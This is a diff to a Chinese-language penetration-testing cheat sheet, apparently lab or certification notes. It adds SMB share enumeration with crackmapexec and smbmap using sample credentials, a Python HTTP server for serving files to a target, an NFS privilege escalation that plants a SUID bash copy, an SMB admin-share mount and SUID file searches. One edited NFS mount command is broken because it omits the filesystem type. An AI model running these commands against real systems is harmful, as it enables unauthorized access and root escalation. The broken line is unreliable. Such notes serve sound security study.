@@ -81,6 +81,9 @@ python3 -m pip list | grep impacket
 python3 -m pip install --upgrade impacket
 # 列舉共享資源
 sudo crackmapexec smb 10.10.10.16 -u king -p 'slave' --shares
+# 替代指令工作 smbmap
+sudo pip3 install smbmap
+smbmap -H 10.10.10.16 -u king -p 'slave'
 ```
 
 ## _net_
@@ -220,6 +223,14 @@ sudo -l
 sudo -i
 ```
 
+## _http server_
+
+利用python指令臨時啟用一個http伺服器，讓靶機可以下載所需要的檔案
+
+```sh
+python -m http.server 8080
+```
+
 ## _Android_
 
 ```sh
@@ -249,19 +260,20 @@ snow -C -p pass text2.txt text3.txt
 ## _Mount NFS & NFS提權_
 
 ```sh
-# to scan the target IP address for an open NFS port (port 2049) 
-rpcinfo -p <Target IP Address>
 # to mount an NFS share on a Linux system
 apt install nfs-common
 service rpcbind start
-showmount -e 10.10.10.20
-sudo mount -t nfs 10.10.10.20:/home /mnt/nfs
+# to scan the target IP address for an open NFS port (port 2049) 
+rpcinfo -p <Target IP Address>
+showmount -e <Target IP Address>
+sudo mount -t <Target IP Address>:/home /mnt/nfs
 sudo cp /bin/bash /mnt/nfs/
 sudo chmod +s /mnt/nfs/bash
 ssh -l user target_ip
 /xxx/bash -p
+
 # to mount an SMB share on a Linux system
-sudo mount -t cifs //10.10.10.20/C$ /mnt/smb -o username=king,password=slave
+sudo mount -t cifs //<Target IP Address>/C$ /mnt/smb -o username=king,password=slave
 ```
 
 ## _smbclient_
@@ -276,7 +288,7 @@ smbclient -U "kingdom\king"  //10.10.10.20/C$
 # Find Files in Windows Command Line
 dir xxx.xxx /s/a/p   
 # Find Files in Linux Command Line
-find / -name xxx.xxx
+find / -name xxx.xxx 2>/dev/null
 # Displays the world executable folders.
 find / -perm -o x -type d 2>/dev/null 
 # Displays the “suid” Bit set files.
